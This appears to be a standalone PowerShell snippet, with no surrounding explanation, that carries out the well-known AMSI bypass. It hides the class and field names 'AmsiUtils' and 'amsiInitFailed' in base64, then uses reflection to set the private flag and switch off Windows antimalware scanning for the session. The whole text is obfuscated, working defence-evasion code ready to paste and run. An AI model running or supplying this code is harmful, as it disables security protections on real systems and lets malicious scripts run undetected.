$a1 = "U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="
$a2 = "YW1zaUluaXRGYWlsZWQ="
[Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a1))).GetField([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($a2)),'NonPublic,Static').SetValue($null,$true)
